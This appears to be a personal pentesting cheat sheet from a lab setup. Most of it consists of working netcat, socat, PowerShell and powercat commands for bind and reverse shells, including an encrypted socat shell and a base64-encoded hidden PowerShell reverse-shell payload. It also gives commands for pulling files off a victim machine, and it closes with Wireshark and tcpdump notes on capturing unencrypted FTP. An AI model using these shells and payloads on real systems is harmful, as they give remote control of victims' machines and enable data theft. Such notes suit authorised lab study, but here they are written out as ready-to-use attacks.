# Tools

```bash
Lab configuration

Attacker : 192.168.10.51
victim linux : 192.168.10.52
victim windows:192.168.10.50

----------------------------------------------------------------------
#1.connect to port using nc & socat

using netcat

attacker:
nc -nv 192.168.10.52 4444

victim:
nc -nlvp 4444

using socat
attacker:
socate -dd - tcp4:192.168.10.52:4444

victim:
socat -ddd tcp4-listen:4444 stdout

---------------------------------------------------------------------------------------------------------------------------------
#2. send file using nc & socat

netcat :
victim:
nc -nlvp 4444 < ~/Desktop/latest/rtl8821CU/wlan0dhcp

client :
nc -nv 192.168.10.52 4444 > abc

******
socat

client:
socat tcp4:192.168.10.52:4444 file:abc.txt,create
server:
socat tcp4-listen:4444,fork file:~/Desktop/file.txt

---------------------------------------------------------------------------------------------------------------------------------
#3.bind shell to execute a command using nc & socat

netcat

victim:
nc -nlvp 4444 -e /bin/bash

client:
nc -nv 192.168.10.52 4444

********
socat

victim
socat tcp4-listen:4445,fork exec:/bin/bash

client
socat tcp4:192.168.10.52:4445 stdout

# socat encrypted bind shells

# Victim Listen
socat -d -d -d OPENSSL-LISTEN:4444,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash

# Attacker Connect
socat - OPENSSL:<IP_VICTIM>:4444, verify=0

----------------------------------------------------------------------
#4. Reverse Shell using nc & socat

- netcat

# victim 
nc -nv <IP> 44444 -e /bin/bash 

# Attacker 
nc -nlvp 4444 

- socat 

# Victim
socat -d -d -d TCP4:<IP_ATTACKER>:4444 EXEC:/bin/bash

# Atacker
socat -d -d -d TCP4-LISTEN:4444

----------------------------------------------------------------------
#5. receive file using powershell
receiver
powershell -c "(new-object System.Net.WebClient).DownloadFile('<http://192.168.10.51:8000/amr.txt','C:\\Users\\victim\\Desktop\\amr2.txt>')"

sender
nc -nlvp 4444 < ~/Desktop/latest/file
----------------------------------------------------------------------
#6. bind shell using powershell

victim (cmd) :
powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',4444);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"

attacket:
nc -nv 192.168.10.50 4444
----------------------------------------------------------------------
#7. reverse bind using powershell

victim (make sure to change the ip &/or port ):
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.10.51',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

attacker:
nc -nlvp 4444
----------------------------------------------------------------------
#8. bind shell using powercat

attacker
nc -nv 192.168.10.50 4444

victim
powercat -l -p 4444 -e cmd.exe

----------------------------------------------------------------------
#9. reverse bind using powercat

victim
powercat -c 192.168.10.51 -p 4444 -e cmd.exe

attacker:
nv -nlvp 4444
----------------------------------------------------------------------
#10.encoding command to gain access using the python tool (use on cmd)

./reversesg.py 192.168.10.51 4444

powershell -NoP -NonI -W Hidden -Exec Bypass -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADEAMAAuADUAMQAiACwANAA0ADQANAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=
----------------------------------------------------------------------
#11. sending file from victim's machine to our machine

victim
powercat -c 192.168.10.51 -p 8000 -i C:\\Users\\victim\\Desktop\\amr2.ps

attacker (just listening):
nc -nlvp 8000 > aaaaa.txt
---------------------------------------------------------------------
# Wireshark 
--------------------------------------
1) Test listening ports
netstat -tulpn | grep :21
--------------------------------------
2) install FTP server
sudo apt install vsftpd
--------------------------------------
3) Run FTP server
/etc/init.d/vsftpd start
or
sudo systemctl vsftpd start
---------------------------------
# Connect to machine ftp server
ftp <IP>
enter username 
enter password
---------------------------------------------
# Wireshark Filters
<https://wiki.wireshark.org/DisplayFilters>
1. set filter to ftp
2. click Follow TCP Stream 
3. You should find the connecting stream unenchrepted
4. save results into file.pcapng
----------------------------------------------
# tcpdump tool 
5. open this file with tcdump tool
	sudo tcpdump -r file.pcapng 
# filtering results
<https://www.redhat.com/sysadmin/filtering-tcpdump>

```
